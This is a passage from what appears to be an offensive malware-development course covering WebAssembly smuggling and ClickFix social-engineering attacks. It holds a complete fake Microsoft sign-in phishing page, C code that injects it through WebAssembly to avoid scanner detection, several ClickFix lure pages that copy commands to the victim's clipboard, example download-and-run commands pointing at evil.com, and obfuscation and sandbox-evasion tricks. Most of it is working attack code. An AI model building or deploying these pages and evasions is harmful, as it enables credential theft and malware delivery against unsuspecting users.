<script src="smuggle.js"></script>
<script>
  document.getElementById("dlFile").addEventListener("click", function() {
    Module.ccall("smuggle_payload", null, [], []);
  });
</script>
...
...

```
The video can be found in folder: `./videos/wasm-demo-1.mov`

### VirusTotal Scan
A VirusTotal scan of the site demonstrates the effectiveness of WebAssembly smuggling, returning zero detections.

## DOM Manipulation
Another use of WebAssembly is to dynamically inject a phishing page directly into the DOM. To do this, we begin by creating the phishing page that will be inserted at runtime. In our example below, our phishing page resembles a Microsoft login page that's designed to capture user credentials and is named `mslogin.html`.

Note: the template excludes the `<html>` tags, as the phishing page will be injected within them at runtime.

```
<head>
<title>Microsoft Sign in</title>
<style>
  :root{
    --brand-blue:#0078d4;
    --brand-blue-hover:#006cbe;
    --field-border:#a6a6a6;
    --card-bg:rgba(255,255,255,.95);
  }
  html,body{
    height:100%;
    margin:0;
    font-family:"Segoe UI", Helvetica, Arial, sans-serif;
    background:url("data:image/png;base64,iVBORw0KGgoAAAANSUh...") center/cover no-repeat fixed;
    display:flex;
    justify-content:center;
    align-items:center;
  }
  .card{
    width:360px;
    padding:40px 48px 48px;
    background:var(--card-bg);
    box-shadow:0 10px 32px rgba(0,0,0,.18);
    border-radius:8px;
    text-align:center;
  }
  .card img{width:40px;margin-bottom:28px;}     
  .title{font-size:28px;font-weight:600;margin:0 0 24px;}
  .field{
    width:100%;
    font-size:16px;
    padding:12px 14px;
    margin-bottom:18px;
    border:1px solid var(--field-border);
    border-radius:4px;
    box-sizing:border-box;
  }
  .field:focus{
    outline:none;
    border-color:var(--brand-blue);
    box-shadow:0 0 0 2px rgba(0,120,212,.2);
  }
  .btn{
    width:100%;
    font-size:16px;
    font-weight:600;
    padding:14px 0;
    border:none;
    border-radius:4px;
    color:#fff;
    background:var(--brand-blue);
    cursor:pointer;
  }
  .btn:hover{background:var(--brand-blue-hover);}
  .btn:active{background:#005ba1;}

  .links{margin-top:20px;font-size:14px;}
  .links a{
    color:var(--brand-blue);
    text-decoration:none;
  }
  .links a:hover{text-decoration:underline;}
</style>
</head>
<body>
  <form class="card" action="login.php" method="POST">
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAhFBMVEXz8/PzUyWBvAYFpvD/ugjz9fb19Pbz+fr39fr69vPy9foAofD/tgDzRQB9ugAAo/Df6dCv0Xjz2dPzTBfzl4PznImz04CAx/H60oHS5vJ5xPH60Hn16dIAnvDz7u3z4t7n7dzzNADzkXurz3BwtQDzvrLM36zf6/Os2PL336z07d/7z3RN8WfWAAABg0lEQVR4nO3cyVLCYBCFURwCkXlygDBFUBTf//3cSGIVf5WrDi7O9wJdp3p/Wy1JkvSrLLzqVDu8FHAzjW57JrZ34+hSH5yWg9jK187PrXx/GMZ2GF9+MZsObmKbzSvhZHgb25CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCwUWE5i21QC/fB86Xp/dLt/DG4t/MGbf7+FNxkl9jZzTrR1TvCeXjJIWFJkv7uIbzqVDe8LAE8Lp+D+zgTu5/FS2zFKUFcrEex9ZaV8Ksf3Sol7N3FNqqFRf8+NkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQsJmhetebOtr75dmi+iO1anTKrrNJbDRsvCuDJQk6Z/1DSzvYqEfRCNJAAAAAElFTkSuQmCC">
    <h2 class="title">Sign in</h2>
    <input class="field" type="text" placeholder="Email, phone, or Skype" required>
    <input class="field" type="password" placeholder="Password" required>
    <button class="btn" type="submit">Sign in</button>
    <div class="links">
      <a href="#">Can't access your account?</a>
    </div>
  </form>
</body>

```

Next, create `main.c` which is our C source file that will be compiled into WebAssembly. This file contains a function that decodes the Base64-encoded phishing contents and injects them into the DOM as a child of the `<html>` element.

```
#include <emscripten/emscripten.h>

EM_JS(void, inject_payload, (void), {
  const target = "BASE64_PHISHING_PAGE"; // REPLACE
  const decoded = atob(target);
  document.documentElement.innerHTML = decoded;
});

int main(void) {
  inject_payload();
  return 0;
}

```
The `BASE64_PHISHING_PAGE` placeholder needs to be replaced with the Base64-encoded phishing page that we created earlier. To Base64-encode it via the terminal, use the command below:

```
# Replace mslogin.html with your file name
base64 -w 0 mslogin.html

```

The final file to create is `login.html`, which contains only the `<html>` tags and a `{{{ SCRIPT }}}` placeholder. This placeholder tells Emscripten where to insert the generated `<script>` tag that loads and runs the compiled WebAssembly module.

```
<!DOCTYPE html>
<html>{{{ SCRIPT }}}</html>

```
We can now compile `main.c` using Emscripten with the command below which tells Emscripten to use `login.html` as the base HTML template, injecting the necessary script to load the WebAssembly module into the `{{{ SCRIPT }}}` placeholder.

```
emcc main.c -o main.html -s ENVIRONMENT=web --shell-file=login.html

```
The image below shows our resulting `main.html` with the injected `main.js` script. This will be the entirety of our static source code for the phishing page.

## Demo
Upon navigating to the generated `main.html` file, it will automatically execute the injection logic defined in the C code at runtime.

The video can be found in folder: `./videos/wasm-demo-2.mov`

Scanning the page using VirusTotal produces no suspicious or malicious detection results.

## Conclusion
Using WebAssembly to build phishing templates or perform file smuggling offers greater evasion capabilities, as most detection engines are not yet effective at analyzing embedded binaries within WebAssembly modules. As a result, WebAssembly smuggling tends to be more effective than traditional methods such as HTML or SVG smuggling.

## Objectives
Download and setup Emscripten

Create a C program that shows a JavaScript alert box, compile it into WebAssembly and use it in your HTML document

Instead of specify an HTML file as the output file during compilation, specify a JavaScript file (i.e. -o out.js) and manually embed it into a custom HTML document

Obfuscate the JS glue code

Produce a single file as the output and then obfuscate it using XOR/AES/RC4

Implement anti-bot measures in a C program, if the user passes the measures, redirect them to a different domain or path


---

# Novo Módulo 9 — Introdução ao ClickFix

Novo Módulo 9 — Introdução ao ClickFix

- # Novo Módulo 9 — Introdução ao ClickFix

# Disclaimer
# Module 9 - Introduction To ClickFix

## Introduction
ClickFix or FakeCAPTCHA is a type of social engineering attack that tricks users into unknowingly run a malicious script or command. Clickfix attacks often present a convincing scenario claiming that running a specific command is necessary to resolve or troubleshoot a problem. For example, in the image below taken from CyberAlberta, the attacker requests the user to prove they are a human by executing a "verification code" in the Windows Run Dialog:However, when the user clicks "copy" a malicious command is copied to the clipboard that is appended by a harmless comment, giving the illusion that nothing malicious is being executed.
```
# The command that is copied to the clipboard:

mshta hxxps://serviceauthfoap[.]com/ # I am not a robot: Cloudflare Verification ID: 18ZW-GAN

```
In this module, we will create ClickFix templates, explore methods for detecting such templates, and examine techniques for obfuscating them.
## Clipboard APIs
ClickFix attacks rely heavily on the JavaScript clipboard manipulation APIs navigator.clipboard.write and navigator.clipboard.writeText which allow JavaScript to copy arbitrary text to the system clipboard. This function requires a trusted user interaction, such as a click, key press, or similar gesture, in order to execute successfully. Without such interaction, the clipboard operation will either fail silently or throw a `DOMException`.Multiple calls to `navigator.clipboard.writeText` can succeed during a single user interaction, as long as they are made synchronously within the same event handler. However, if the call stack completes or an asynchronous operation such as `setTimeout` or `await` is used, the user activation context is lost. After that point, any additional clipboard writes will only succeed if triggered by a new user gesture. Additionally, browsers impose a short fixed timeout after a user gesture, after which the transient user activation expires.For example, if the `copyBtn` button is clicked below, it allows for the clipboard to be manipulated successfully.
```
<button id="copyBtn">Copy</button>

<script>
document.getElementById('copyBtn').addEventListener('click', () => {
  navigator.clipboard.writeText('Copied to Maldev Academy\'s clipboard')
});
</script>

```
Likewise, the snippet below also works because both calls to `navigator.clipboard.writeText` are made synchronously within the same user-initiated click event. Since the second call is chained directly in the first `.then()`, it executes before the user activation context expires, allowing both clipboard writes to succeed.
```
<button id="copyBtn">Copy</button>

<script>
document.getElementById('copyBtn').addEventListener('click', () => {
  navigator.clipboard.writeText('First copy')
    .then(() => navigator.clipboard.writeText('Second copy'));
});
</script>

```
The snippet below fails because the second `navigator.clipboard.writeText` call runs inside `setTimeout`, which is no longer within the direct user-gesture context required by the Clipboard API.
```
<button id="copyBtn">Copy</button>

<script>
document.getElementById('copyBtn').addEventListener('click', () => {
  navigator.clipboard.writeText('First copy');
  setTimeout(() => {
    navigator.clipboard.writeText('Second copy');
  }, 5000);
});
</script>

```

## Building ClickFix Template
We begin by designing a ClickFix template that entices the user to perform a specific action. A commonly used example is the fake ReCAPTCHA prompt, as previously shown, but such templates have been widely abused and are more likely to trigger detection mechanisms. Instead, for this module, we'll use a two-page HTML flow:
Landing page - A landing page that states a document has been shared with the target user.

- ClickFix page - When the user clicks "View Document" on the landing page, they are redirected to a second page designed to mimic the online version of Microsoft Word, which instructs the user to run a command to resolve a fake issue preventing the document from loading.

### Landing Page
The landing page will be a relatively straightforward HTML document that informs the user of a file being shared with them with a button that states "View Document" that uses JavaScript to redirect to `clickfix.html` which is our ClickFix page.

```
<!DOCTYPE html>
<html>
<head>
  <title>File Shared</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background: white;
      width: 450px;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
      text-align: center;
    }
    .icon {
      width: 40px;
      height: 40px;
      margin: 0 auto 10px;
    }
    .icon svg {
      width: 100%;
      height: 100%;
      fill: #0078d4;
    }
    .file-box {
      border: 1px solid #ccc;
      border-radius: 6px;
      padding: 12px;
      margin: 20px 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .file-box img {
      width: 24px;
      margin-right: 10px;
    }
    .small-note {
      color: #666;
      font-size: 13px;
      margin-top: 8px;
    }
    #dlFile {
      margin-top: 20px;
      background: #0078d4;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    .footer {
      font-size: 12px;
      margin-top: 40px;
      color: #666;
      text-align: center;
    }
    .footer img {
      vertical-align: middle;
      height: 14px;
    }
    .logo {
      position: absolute;
      bottom: 20px;
      right: 20px;
    }
  </style>
</head>
<body>

<div class="card">
    <div class="icon">
    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
      <path d="M0 25.472q0 2.368 1.664 4.032t4.032 1.664h18.944q2.336 0 4-1.664t1.664-4.032v-8.192l-3.776 3.168v5.024q0 0.8-0.544 1.344t-1.344 0.576h-18.944q-0.8 0-1.344-0.576t-0.544-1.344v-18.944q0-0.768 0.544-1.344t1.344-0.544h9.472v-3.776h-9.472q-2.368 0-4.032 1.664t-1.664 4v18.944zM5.696 19.808q0 2.752 1.088 5.28 0.512-2.944 2.24-5.344t4.288-3.872 5.632-1.664v5.6l11.36-9.472-11.36-9.472v5.664q-2.688 0-5.152 1.056t-4.224 2.848-2.848 4.224-1.024 5.152zM32 22.080v0 0 0z"/>
    </svg>
  </div>
  <h3>Jack Smith shared a file with you</h3>
  <p>Please review the attached document</p>

  <div class="file-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Microsoft_Office_Word_%282019%E2%80%93present%29.svg/2203px-Microsoft_Office_Word_%282019%E2%80%93present%29.svg.png">
    <span>Updated Payroll Schedule</span>
  </div>

  <div class="small-note">This link only works for the direct recipients of this message.</div>

  <button id="dlFile">View Document</button>
</div>
<script>
document.getElementById('dlFile').addEventListener('click', function(e) {
  e.preventDefault();
  window.location.href = 'clickfix.html';
});
</script>
</body>
</html>

```

### ClickFix Template (1)
The ClickFix page initially displays an overlay indicating that the encrypted document, "Payroll Schedule.docx", is being fetched. After three seconds, the overlay is removed and a message is shown stating that the document failed to load due to the absence of a required browser extension for decryption. The background image is from a sample Microsoft Word document and partially blurred using imtools.co.

Clicking the "Fix" button copies the command `cmd.exe /c "ping example.com"` to the clipboard using `navigator.clipboard.writeText`. After copying, the user is instructed to open the Windows Run dialog using a keyboard shortcut and paste the command.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Failed To Load</title>
    <style>
        html, body{height:100%;margin:0;}
        body{
            background:url('bg.png') no-repeat center center fixed;
            background-size:cover;
            display:flex;
            align-items:center;
            justify-content:center;
            font-family:"Segoe UI","Segoe UI Variable",Tahoma,Verdana,sans-serif;
        }
        #overlay{
            position:fixed;
            inset:0;
            background:#ffffff;
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            z-index:9999;
        }
        #overlay .spinner{
            width:48px;
            height:48px;
            border:6px solid #e0e0e0;
            border-top-color:#007bff;
            border-radius:50%;
            animation:spin 1s linear infinite;
            margin-bottom:20px;
        }
        @keyframes spin{to{transform:rotate(360deg);}}
        #overlay h2{margin:0 0 12px;font-size:1.1rem;color:#444;}
        #overlay span{font-size:.9rem;color:#666;}
        .card{
            background:#fff;
            padding:40px 60px;
            text-align:center;
            border-radius:8px;
            box-shadow:0 4px 12px rgba(0,0,0,.1);
            max-width:400px;
            width:90%;
            display:none;
        }
        .card img{width:80px;height:80px;object-fit:contain;margin-bottom:24px;}
        .card h1{font-size:1.5rem;margin:0 0 16px;color:#333;}
        .card p{font-size:1rem;color:#555;margin:0 0 32px;}
        .actions{display:flex;gap:16px;justify-content:center;}
        .btn{flex:1;padding:12px 0;font-size:1rem;border:none;border-radius:4px;cursor:pointer;}
        .btn.fix{background:#007bff;color:#fff;}
        .btn.fix:hover{background:#0069d9;}
        .btn.details{background:#e0e0e0;color:#333;}
        .btn.details:hover{background:#cfcfcf;}
    </style>
</head>
<body>
    <div id="overlay">
        <div class="spinner"></div>
        <h2>Fetching encrypted document...</h2>
        <span>Please wait</span>
    </div>

    <div class="card">
        <img src="icon.png" alt="Document Icon">
        <h1>"Payroll Schedule.docx" Failed To Load</h1>
        <p>A browser extension is required to view this encrypted document.</p>
        <div class="actions">
            <button class="btn fix">Fix</button>
            <button class="btn details">Details</button>
        </div>
    </div>

    <script>
        setTimeout(function(){
            document.getElementById('overlay').remove();
            document.querySelector('.card').style.display='block';
        },3000);

        document.body.addEventListener('click',function(e){
            if(e.target.matches('.btn.details')){
                var card=document.querySelector('.card');
                card.innerHTML='<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;"><h1>Extension Required</h1><p>This document requires a browser extension to securely display the contents of this file.</p><div class="actions"><button class="btn fix">Fix</button></div>';
            }else if(e.target.matches('.btn.fix')){
                navigator.clipboard.writeText('cmd.exe /c "ping example.com"');
                var card=document.querySelector('.card');
                card.innerHTML='<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;"><h1>Download Extension</h1><p>Press <button>Win</button> + <button>R</button>, then <button>Ctrl</button> + <button>V</button>, then <button>Enter</button>.</p>';
            }
        });
    </script>
</body>
</html>

```

### ClickFix Template (2)
Another slightly similar ClickFix template is provided below where the user is prompted to activate Microsoft Word in order to view the document. Upon clicking the activation code, the instructions are revealed, and the corresponding command is copied to the clipboard.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Failed To Load</title>
    <style>
        html, body{height:100%;margin:0;}
        body{
            background:url('bg.png') no-repeat center center fixed;
            background-size:cover;
            display:flex;
            align-items:center;
            justify-content:center;
            font-family:"Segoe UI","Segoe UI Variable",Tahoma,Verdana,sans-serif;
        }
        .card{
            background:#fff;
            padding:40px 60px;
            text-align:center;
            border-radius:8px;
            box-shadow:0 4px 12px rgba(0,0,0,.1);
            max-width:400px;
            width:90%;
        }
        .card img{
            width:80px;
            height:80px;
            object-fit:contain;
            margin-bottom:24px;
        }
        .card h1{font-size:1.5rem;margin:0 0 16px;color:#333;}
        .card p{font-size:1rem;color:#555;margin:0 0 32px;}

        .code-viewer{
            position:relative;
            background:#f5f5f5;
            border:1px solid #ddd;
            border-radius:6px;
            padding:16px;
            font-family:Consolas,monospace;
            cursor:pointer;
            transition:background .2s;
            user-select:none;
        }
        .code-viewer:hover{background:#e0e0e0;}
        .hint{
            position:absolute;
            top:0;left:0;right:0;bottom:0;
            display:flex;
            align-items:center;
            justify-content:center;
            color:#666;
            font-weight:600;
            background:rgba(255,255,255,.85);
            opacity:0;
            transition:opacity .2s;
            pointer-events:none;
        }
        .code-viewer:hover .hint{opacity:1;}
    </style>
</head>
<body>
    <div class="card">
        <img src="icon.png" alt="Document Icon">
        <h1>"Payroll Schedule.docx" Failed To Load</h1>
        <p>You need to activate Microsoft Word to view this document.</p>

        <div id="codeBlock" class="code-viewer">
            Activation Code: CXIAIUSDAIJSKDSK32281
            <div class="hint">CLICK TO COPY</div>
        </div>
    </div>

    <script>
        document.getElementById('codeBlock').addEventListener('click',function(){
            navigator.clipboard.writeText('cmd.exe /c "ping example.com"');
            const card=document.querySelector('.card');
            card.innerHTML=
                '<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;" alt="Company Logo">'+
                '<h1>Activate Microsoft Word</h1>'+
                '<p>Press <button>Win</button> + <button>R</button>, then <button>Ctrl</button> + <button>V</button>, then <button>Enter</button>.</p>';
        });
    </script>
</body>
</html>

```

### Demo
The demo below shows us going through the landing page, ClickFix page and executing the copied command into the Windows Run Dialog which uses `cmd.exe` to ping `example.com`.

The video can be found in folder: `./videos/demo-clickfix.mp4`

## Executing Commands Via Run Dialog
In the previous demonstration the executed command was a simple `ping` command but in real engagements the commands would be crafted to help gain access. Below are some ways attackers can craft commands to be executed through the Windows Run Dialog

- `cmd.exe /c ...` – Executes a command via `cmd.exe`. This allows attackers to craft an elaborate command that downloads and executes malware (e.g. `cmd.exe /c "curl https://evil.com/malware.exe -o C:\users\public\desktop\malware.exe && C:\users\public\desktop\malware.exe`) but it comes at a cost of operational security as `cmd.exe` is highly monitored and considered suspicious when used.

- `powershell.exe -Command ...` – Runs a PowerShell command or script. This is similar to `cmd.exe` but provides added flexibility and allows obfuscation and in-memory execution.

- `mshta.exe https://evil.com/malware.hta` – Executes a remote or HTA file. It's also possible to run an inline-command (e.g. `mshta.exe "javascript:var s=new ActiveXObject('WScript.Shell'); s.Run('ping google.com', 0); close();"`).

- `msiexec /i /q https://evil.com/malware.msi` – Installs a remote MSI file silently.

These commands should be obfuscated prior to being placed inside `navigator.clipboard.writeText` as it can be an easy indicator of a ClickFix website. With that said, the module will continue to use the `cmd.exe /c ping example.com` as the command being copied to the clipboard to maintain simplicity.

## ClickGrab Analyzer
To show how ClickFix websites can be detected, we will scan our ClickFix page via ClickGrab Analyzer, a web service built by @M_haggis to scan and detect ClickFix websites. Scanning our current template, we receive a high threat score due to several factors including the keywords `cmd`, `.exe`, and the command `cmd.exe /c "ping example.com"`. These suspicious keywords combined with the clipboard being manipulated, results in our high threat score.

Avoiding a high threat score with ClickGrab is relatively easy, as it does not appear to scan the embedded URLs. This allows us to simply fetch the actual ClickFix payload using the snippet below and update the DOM with the fetched content.

```
<div id="content"></div>

<script>
fetch('content.html')
  .then(response => response.text())
  .then(html => {
    document.getElementById('content').innerHTML = html;
  })
  .catch(error => console.error('Error loading HTML:', error));
</script>

```

Alternatively, we can keep the ClickFix page but obfuscate the `navigator.clipboard.writeText` function and the command by breaking them into smaller parts using array joins, and then reconstruct and invoke them at runtime.

```
const a = ["n", "a", "v", "i", "g", "a", "t", "o", "r"].join("");
const b = ["c", "l", "i", "p", "b", "o", "a", "r", "d"].join("");
const c = ["w", "r", "i", "t", "e", "T", "e", "x", "t"].join("");
const x = [
    "c", "m", "d", ".", "e", "x", "e", " ",
    "/", "c", " ",
    "p", "i", "n", "g", " ",
    "e", "x", "a", "m", "p", "l", "e", ".", "c", "o", "m"
].join("");

const ab = window[a][b];

ab[c](x);

```
When we use the above code for clipboard manipulation and re-scan our website via ClickGrab, our threat score is reduced successfully.

## Manipulating ClickFix Behaviour
A final consideration is that some security sandboxes monitor the clipboard for changes and automatically execute any detected commands. For example, Joe Sandbox has been observed doing this, as shown in this tweet. To interfere with this behavior, we will demonstrate multiple scenarios involving repeated clipboard manipulation in an effort to modify the typical ClickFix attack behavior of single clipboard access.

### Technique 1: Mouse Down & Up
Recall that `navigator.clipboard.writeText` can only be called through user interaction such as a click or key press. A click can be split into two separate interactions: mouse down and mouse up. This allows setting the clipboard to decoy content on mouse down and then to malicious content on mouse up. Depending on how the security solution is configured, it may execute the harmless content instead of the malicious one while the user's experience remains seamless.

The HTML document below attaches two event listeners to the activation code: one on mouse down to write harmless content, and another on mouse up to write the actual malicious command.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Failed To Load</title>
    <style>
        html, body{height:100%;margin:0;}
        body{
            background:url('bg.png') no-repeat center center fixed;
            background-size:cover;
            display:flex;
            align-items:center;
            justify-content:center;
            font-family:"Segoe UI","Segoe UI Variable",Tahoma,Verdana,sans-serif;
        }
        .card{
            background:#fff;
            padding:40px 60px;
            text-align:center;
            border-radius:8px;
            box-shadow:0 4px 12px rgba(0,0,0,.1);
            max-width:400px;
            width:90%;
        }
        .card img{
            width:80px;
            height:80px;
            object-fit:contain;
            margin-bottom:24px;
        }
        .card h1{font-size:1.5rem;margin:0 0 16px;color:#333;}
        .card p{font-size:1rem;color:#555;margin:0 0 32px;}

        .code-viewer{
            position:relative;
            background:#f5f5f5;
            border:1px solid #ddd;
            border-radius:6px;
            padding:16px;
            font-family:Consolas,monospace;
            cursor:pointer;
            transition:background .2s;
            user-select:none;
        }
        .code-viewer:hover{background:#e0e0e0;}
        .hint{
            position:absolute;
            top:0;left:0;right:0;bottom:0;
            display:flex;
            align-items:center;
            justify-content:center;
            color:#666;
            font-weight:600;
            background:rgba(255,255,255,.85);
            opacity:0;
            transition:opacity .2s;
            pointer-events:none;
        }
        .code-viewer:hover .hint{opacity:1;}
    </style>
</head>
<body>
    <div class="card">
        <img src="icon.png" alt="Document Icon">
        <h1>"Payroll Schedule.docx" Failed To Load</h1>
        <p>You need to activate Microsoft Word to view this document.</p>

        <div id="codeBlock" class="code-viewer">
            Activation Code: CXIAIUSDAIJSKDSK32281
            <div class="hint">CLICK TO COPY</div>
        </div>
    </div>

    <script>
        const codeBlock = document.getElementById('codeBlock');

        // Mouse pressed down
        codeBlock.addEventListener('mousedown', function() {
            navigator.clipboard.writeText('Maldev Academy was here!'); // Decoy content
            console.log('Copied harmless command');
        });

        // Mouse released
        codeBlock.addEventListener('mouseup', function() {
            navigator.clipboard.writeText('cmd.exe /c "ping example.com"');
            console.log('Copied malicious command');
            const card = document.querySelector('.card');
            card.innerHTML =
                '<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;" alt="Company Logo">' +
                '<h1>Activate Microsoft Word</h1>' +
                '<p>Press <button>Win</button> + <button>R</button>, then <button>Ctrl</button> + <button>V</button>, then <button>Enter</button>.</p>';
        });
    </script>
</body>
</html>

```

### Technique 2: Two-Step Click
Another strategy is to design the ClickFix phishing page to require at least two clicks to reveal the malicious command. In a two-step ClickFix setup, the first click writes a harmless command to the clipboard, while the next one reveals the actual malicious command.

The HTML document below begins with two buttons labeled "Fix" and "Details". When either button is clicked, a harmless command is written to the clipboard. In the next step, when the activation code is clicked for copying, the malicious command is written to the clipboard.

```
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Document Failed To Load</title>
        <style>
            html,
            body {
                height: 100%;
                margin: 0;
            }
            body {
                background: url("bg.png") no-repeat center center fixed;
                background-size: cover;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: "Segoe UI", "Segoe UI Variable", Tahoma, Verdana, sans-serif;
            }
            .card {
                background: #fff;
                padding: 40px 60px;
                text-align: center;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
                max-width: 400px;
                width: 90%;
            }
            .card img {
                width: 80px;
                height: 80px;
                object-fit: contain;
                margin-bottom: 24px;
            }
            .card h1 {
                font-size: 1.5rem;
                margin: 0 0 16px;
                color: #333;
            }
            .card p {
                font-size: 1rem;
                color: #555;
                margin: 0 0 32px;
            }
            .actions {
                display: flex;
                gap: 16px;
                justify-content: center;
            }
            .btn {
                flex: 1;
                padding: 12px 0;
                font-size: 1rem;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
            .btn.fix {
                background: #007bff;
                color: #fff;
            }
            .btn.fix:hover {
                background: #0069d9;
            }
            .btn.details {
                background: #e0e0e0;
                color: #333;
            }
            .btn.details:hover {
                background: #cfcfcf;
            }
            .code-viewer {
                position: relative;
                background: #f5f5f5;
                border: 1px solid #ddd;
                border-radius: 6px;
                padding: 16px;
                font-family: Consolas, monospace;
                cursor: pointer;
                transition: background 0.2s;
                user-select: none;
            }
            .code-viewer:hover {
                background: #e0e0e0;
            }
            .hint {
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #666;
                font-weight: 600;
                background: rgba(255, 255, 255, 0.85);
                opacity: 0;
                transition: opacity 0.2s;
                pointer-events: none;
            }
            .code-viewer:hover .hint {
                opacity: 1;
            }
        </style>
    </head>
    <body>
        <div class="card">
            <img src="icon.png" alt="Document Icon" />
            <h1>"Payroll Schedule.docx" Failed To Load</h1>
            <p>You need to activate Microsoft Word to view this document.</p>
            <div class="actions">
                <button id="fixBtn" class="btn fix">Fix</button>
                <button id="detailsBtn" class="btn details">Details</button>
            </div>
        </div>

        <script>
            document.getElementById("detailsBtn").addEventListener("click", function () {
                const card = document.querySelector(".card");
                card.innerHTML =
                    '<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;" alt="Company Logo">' +
                    "<h1>Activate Microsoft Word</h1>" +
                    "<p>This document requires a browser extension to securely display the contents of this file. Click the button below and follow the instructions to activate Microsoft Word.</p>" +
                    '<div class="actions"><button id="fixBtn" class="btn fix">Fix</button></div>';
            });

            document.body.addEventListener("click", function (e) {
                if (e.target.id === "fixBtn") {
                    navigator.clipboard.writeText("Maldev Academy was here!"); // Decoy write to clipboard
                    const actions = document.querySelector(".actions");
                    actions.innerHTML = '<div id="codeBlock" class="code-viewer">Activation Code: CXIAIUSDAIJSKDSK32281<div class="hint">CLICK TO COPY</div></div>';
                    document.getElementById("codeBlock").addEventListener("click", function () {
                        navigator.clipboard.writeText("cmd.exe /c ping google.com & :: Microsoft Activation Code: CXIAIUSDAIJSKDSK32281");
                        const card = document.querySelector(".card");
                        card.innerHTML =
                            '<img src="icon.png" style="width:80px;height:80px;object-fit:contain;margin-bottom:12px;" alt="Company Logo">' +
                            "<h1>Activate Microsoft Word</h1>" +
                            "<p>Press <button>Win</button> + <button>R</button>, then <button>Ctrl</button> + <button>V</button>, then <button>Enter</button>.</p>";
                    });
                }
            });
        </script>
    </body>
</html>

```

### Technique 3: Mass Writes To Clipboard
As noted earlier in the module, clipboard writes can occur multiple times during a single user interaction if they happen synchronously within the same event handler. This behavior can be used to potentially interfere with automated analysis by writing several values to the clipboard before writing the final malicious command. In the example below, ten commands are written, with the tenth being the malicious one.

```
<button id="copyBtn">Copy</button>

<script>
document.getElementById('copyBtn').addEventListener('click', () => {
  navigator.clipboard.writeText('Harmless command 1')
    .then(() => navigator.clipboard.writeText('Harmless command 2'))
    .then(() => navigator.clipboard.writeText('Harmless command 3'))
    .then(() => navigator.clipboard.writeText('Harmless command 4'))
    .then(() => navigator.clipboard.writeText('Harmless command 5'))
    .then(() => navigator.clipboard.writeText('Harmless command 6'))
    .then(() => navigator.clipboard.writeText('Harmless command 7'))
    .then(() => navigator.clipboard.writeText('Harmless command 8'))
    .then(() => navigator.clipboard.writeText('Harmless command 9'))
    .then(() => navigator.clipboard.writeText('cmd.exe /c ping google.com & :: Microsoft Activation Code: CXIAIUSDAIJSKDSK32281'));
});
</script>

```
The above snippet is integrated into the ClickFix phishing page, causing all ten commands to be copied when the activation code is clicked, with the final one being the malicious command.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Failed To Load</title>
    <style>
        html, body{height:100%;margin:0;}
        body{
            background:url('bg.png') no-repeat center center fixed;
            background-size:cover;
            display:flex;
            align-items:center;
            justify-content:center;
            font-family:"Segoe UI","Segoe UI Variable",Tahoma,Verdana,sans-serif;
        }
        .card{
            background:#fff;
            padding:40px 60px;
            text-align:center;
            border-radius:8px;
            box-shadow:0 4px 12px rgba(0,0,0,.1);
            max-width:400px;
            width:90%;
        }
        .card img{
            width:80px;
            height:80px;
            object-fit:contain;
            margin-bottom:24px;
        }
        .card h1{font-size:1.5rem;margin:0 0 16px;color:#333;}
        .card p{font-size:1rem;color:#555;margin:0 0 32px;}

        .code-viewer{
            position:relative;
            background:#f5f5f5;
            border:1px solid #ddd;
            border-radius:6px;
            padding:16px;
            font-family:Consolas,monospace;
            cursor:pointer;
            transition:background .2s;
            user-select:none;
        }
        .code-viewer:hover{background:#e0e0e0;}
        .hint{
            position:absolute;
            top:0;left:0;right:0;bottom:0;
            display:flex;
            align-items:center;
            justify-content:center;
            color:#666;
            font-weight:600;
            background:rgba(255,255,255,.85);
            opacity:0;
            transition:opacity .2s;
            pointer-events:none;
        }
        .code-viewer:hover .hint{opacity:1;}
    </style>
</head>
<body>
    <div class="card">
        <img src="icon.png" alt="Document Icon">
        <h1>"Payroll Schedule.docx" Failed To Load</h1>
        <p>You need to activate Microsoft Word to view this document.</p>

        <div id="codeBlock" class="code-viewer">
            Activation Code: CXIAIUSDAIJSKDSK32281
